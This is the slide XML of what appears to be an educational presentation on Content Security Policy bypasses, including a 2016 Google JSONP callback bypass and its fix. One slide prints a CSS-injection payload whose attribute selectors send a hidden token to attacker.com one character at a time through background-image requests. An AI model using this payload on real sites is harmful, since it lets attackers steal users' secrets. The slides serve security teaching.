          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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Content-Security-Policy: script-src 'none'; style-src 'unsafe-inline'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="224944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124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="2511623"/>
            <a:ext cx="7825502" cy="3436144"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 495"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3396853" y="2511623"/>
            <a:ext cx="7836694" cy="3436144"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 495"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="2596634"/>
            <a:ext cx="7609999" cy="3266123"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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 Assume there's a sensitive input field like a password or token --&gt;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&lt;input type="text" id="secretInput" value="secret_token_123" style="display: none;"&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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&lt;style&gt;</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 Attacker's CSS injected into the page */</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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 Exfiltrate the first character of the 'value' attribute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input[value^="s"] { background: url('https://attacker.com/log?char=s');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input[value^="e"] { background: url('https://attacker.com/log?char=e');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input[value^="c"] { background: url('https://attacker.com/log?char=c');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input[value^="r"] { background: url('https://attacker.com/log?char=r');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input[value^="t"] { background: url('https://attacker.com/log?char=t');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input[value^="o"] { background: url('https://attacker.com/log?char=o');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input[value^="k"] { background: url('https://attacker.com/log?char=k');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input[value^="n"] { background: url('https://attacker.com/log?char=n');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input[value^="1"] { background: url('https://attacker.com/log?char=1');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input[value^="2"] { background: url('https://attacker.com/log?char=2');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input[value^="3"] { background: url('https://attacker.com/log?char=3');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 ... this would be repeated for all possible characters and positions */</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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 More advanced: Exfiltrate the second character (e.g., if first is 's')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input[value^="se"] { background: url('https://attacker.com/log?char=e');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  /* And so on, building up the string character by character */</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2EFE8"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>&lt;/style&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="6011466"/>
            <a:ext cx="7825502" cy="998934"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1703"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C9DDE9"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="12" name="Image 0" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515797" y="6109573"/>
            <a:ext cx="177165" cy="141684"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3806309" y="6096476"/>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000000"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Why it works:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3806309" y="6330315"/>
            <a:ext cx="7308294" cy="544388"/>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000000"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CSS attribute selectors can read values</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Background images trigger HTTP requests</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Can exfiltrate data character by character</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>No JavaScript required</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592455" y="1224082"/>
            <a:ext cx="675323" cy="290632"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6990"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBE8F0"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>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4015" y="1301710"/>
            <a:ext cx="135374" cy="135374"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="897017" y="1274802"/>
            <a:ext cx="269200" cy="189190"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1450"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>2016</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="592455" y="1565196"/>
            <a:ext cx="6963847" cy="528995"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="4150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Real-World CSP Bypass Examples</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="592455" y="2144673"/>
            <a:ext cx="5067657" cy="423267"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">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Example 1: Google CSP Bypass</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="592455" y="2618423"/>
            <a:ext cx="2116217" cy="264438"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1650" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable CSP:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="592455" y="3072289"/>
            <a:ext cx="7959090" cy="490299"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5179"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="584002" y="3072289"/>
            <a:ext cx="7975997" cy="490299"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5179"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="753189" y="3199209"/>
            <a:ext cx="7637621" cy="236458"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2EFE8"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Content-Security-Policy: script-src 'self' https://www.google.com https://apis.google.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="592455" y="3752017"/>
            <a:ext cx="2116217" cy="264438"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1650" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Bypass Method:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="592455" y="4205883"/>
            <a:ext cx="7959090" cy="490299"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5179"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="584002" y="4205883"/>
            <a:ext cx="7975997" cy="490299"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5179"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="753189" y="4332803"/>
            <a:ext cx="7637621" cy="236458"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="16" name="Image 2" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="592455" y="4838224"/>
            <a:ext cx="846415" cy="1151453"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1565196" y="5007412"/>
            <a:ext cx="2116217" cy="264438"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1650" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Why it worked</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1565196" y="5347573"/>
            <a:ext cx="6986349" cy="472916"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Google's autocomplete API supported JSONP. Callback parameter was not validated. Allowed arbitrary JavaScript execution.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="19" name="Image 3" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId7"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="592455" y="5989677"/>
            <a:ext cx="846415" cy="1015722"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1565196" y="6158865"/>
            <a:ext cx="2116217" cy="264438"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1650" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Fix</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1565196" y="6499027"/>
            <a:ext cx="6986349" cy="236458"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Google removed JSONP support. Implemented proper callback validation.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77873" y="959168"/>
            <a:ext cx="1053465" cy="316230"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6861"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBE8F0"/>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6339" y="1045012"/>
            <a:ext cx="144542" cy="144542"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1403152" y="1013341"/>
            <a:ext cx="619720" cy="207883"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>2017-2018</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1077873" y="1333024"/>
            <a:ext cx="6032659" cy="564952"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
